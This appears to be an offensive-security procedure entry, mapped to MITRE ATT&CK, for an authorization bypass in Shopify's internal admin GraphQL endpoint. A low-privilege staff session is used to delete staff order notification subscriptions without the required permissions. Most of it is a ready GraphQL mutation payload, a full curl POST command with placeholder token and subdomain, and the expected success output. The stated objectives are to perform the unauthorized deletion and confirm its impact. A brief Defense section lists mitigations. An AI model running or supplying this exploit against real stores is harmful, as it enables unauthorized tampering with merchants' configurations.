---
tags:
  - graphql
  - mutation
  - deletion
  - authorization-bypass
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/staffOrderNotificationSubscriptionDelete-Mutation]]'
platforms:
  - Web
  - Shopify
techniques:
  - '[[Exploitation for Privilege Escalation]]'
skill_level: intermediate
impact_level: low
detection_risk: medium
sub_techniques: []
id: 05080a5b-d4de-4dc9-b5d4-2c68a16884be
created_at: '2025-12-14T17:29:29.018Z'
updated_at: '2025-12-14T17:29:29.018Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---
# Delete-Subscription-via-GraphQL-Mutation

## Summary

This procedure executes a GraphQL mutation to delete a staff order notification subscription using a low-privilege staff session, bypassing required 'Order' permissions.

## Description

The Shopify GraphQL API at /admin/internal/web/graphql/core lacks proper authorization checks, allowing 'Settings' users to delete subscriptions. Using the extracted GID, send a POST request with the mutation. Target is the internal GraphQL endpoint; prerequisites include an active staff session. Outcome is subscription removal, disrupting notifications.

## Requirements

1. Active low-privilege staff session with session token
2. Extracted subscription GID
3. HTTP client like curl

## Defense

Defensive measures and detection strategies:

- Add explicit permission validation in GraphQL resolvers for staffOrderNotificationSubscriptionDelete
- Audit API logs for mutations from low-priv accounts
- Implement webhook notifications for configuration changes

## Objectives

1. Perform unauthorized deletion
2. Confirm success without errors
3. Validate impact on notifications

## Instructions

### Step 1: Prepare the Mutation Query

**Context**: Construct the GraphQL payload with the target GID.

**Command** ([[commands/staffOrderNotificationSubscriptionDelete-Mutation]]):

```bash
{"query": "mutation{staffOrderNotificationSubscriptionDelete(staffOrderNotificationSubscriptionId:\"gid://shopify/StaffOrderNotificationSubscription/82867191864\"){userErrors{message}}}" }
```

> Replace the GID with the extracted value.

### Step 2: Send the POST Request

**Context**: Execute the mutation against the API endpoint using the staff session.

**Command** ([[commands/staffOrderNotificationSubscriptionDelete-Mutation]]):

```bash
curl -X POST https://yoursubdomain.myshopify.com/admin/internal/web/graphql/core?operation=SwitcherNoStores \
  -H "Content-Type: application/json" \
  -H "X-Shopify-Access-Token: YOUR_STAFF_TOKEN" \
  -d '{"query": "mutation{staffOrderNotificationSubscriptionDelete(staffOrderNotificationSubscriptionId:\"gid://shopify/StaffOrderNotificationSubscription/82867191864\"){userErrors{message}}}" }'
```

> Expected output: {"staffOrderNotificationSubscriptionDelete":{"userErrors":[]}}. Verify by checking settings page.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation]]

### Sub-Techniques


## Commands Used

- [[commands/staffOrderNotificationSubscriptionDelete-Mutation]]

## Tools Used


## Tags

- graphql-mutation
- bypass
